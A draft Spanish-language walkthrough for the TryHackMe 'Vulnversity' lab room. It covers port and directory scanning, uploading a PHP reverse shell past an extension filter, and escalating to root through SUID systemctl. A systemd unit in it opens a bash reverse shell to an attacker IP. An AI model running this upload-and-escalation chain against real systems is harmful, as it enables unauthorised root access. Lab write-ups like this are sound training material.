---
draft: "true"
---

La máquina a explotar está en la room: https://tryhackme.com/r/room/vulnversity
## Reconocimiento de puertos
`sudo nmap -sV -O IP`

## Reconocimiento de rutas
`gobuster dir -u http://10.10.91.191:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt`

## Uso de burpsuite
Subir la reverse shell de pentest monkey
[[php-reverse-shell.php]]

Con la burpsuite adivinamos que debe ser .phtml

## Obtención de reverse shell (user)

`nc -lvp 2222`
Ejecuto el archivo subido desde la web /internal/uploads

`find / -type f -name user.txt 2>/dev/null`


## Escalada de privilegios
`find / -user root -perm /4000 2>/dev/null`

Crear un servicio
```
[Unit]
Description=My Root Service

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.23.31.178/4444 0>&1'
User=root
Type=simple

[Install]
WantedBy=multi-user.target
```

Subir eso a través de la web de /internal
`find / -type f -name root.phtml 2>/dev/null` 
`mv root.phtml > root.service`
`/bin/systemctl enable /var/www/html/internal/uploads/root.service 

En kali: `nc -lvp 4444`
En la máquina: `/bin/systemctl start root

`find / -type f -name root.txt`
